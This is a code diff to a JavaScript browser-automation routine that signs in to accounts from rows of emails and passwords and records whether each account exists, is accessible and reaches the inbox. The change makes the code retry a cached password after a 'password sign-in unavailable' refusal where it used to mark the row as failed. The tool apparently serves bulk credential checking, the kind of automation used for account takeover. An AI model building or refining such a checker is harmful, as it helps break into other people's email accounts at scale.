@@ -2076,21 +2076,9 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 }
 
                                 if (passwordUnavailableDetected) {
-                                    initialCheckResult = {
-                                        emailExists: true, accountAccess: false, reachedInbox: false,
-                                        requiresVerification: false, verificationState: null,
-                                        message: "Password sign-in isn't available for this account. Try another sign-in method."
-                                    };
-                                    finalStatus = "FAILED";
-                                    updateData.status = "FAILED";
-                                    updateData.lastJsonResponse = JSON.stringify({
-                                        browserId, email, status: "FAILED",
-                                        emailExists: true, accountAccess: false, reachedInbox: false,
-                                        requiresVerification: false, verificationState: null,
-                                        platform, timestamp: new Date().toISOString(),
-                                        message: "Password sign-in isn't available for this account. Try another sign-in method."
-                                    });
-                                    break; // Exit password processing
+                                    logger.info(`[processRow][${browserId}] Password sign-in unavailable detected. handleAdditionalViews clicked Back. Waiting 5s then auto-retrying same password via while loop.`);
+                                    await new Promise(res => setTimeout(res, 5000));
+                                    continue; // Go back to top of while loop to re-type cached password and resubmit
                                 }
 
                                 // **CRITICAL**: Check for login failed (incorrect password) BEFORE checking verification/inbox
@@ -2186,7 +2174,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     });
                                     // Clear the password field and persist the WAITINGPASSWORD state
                                     logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
-                                    updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
+                                    await updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                     return; // Exit processRow so no later logic overwrites status
                                 }
 
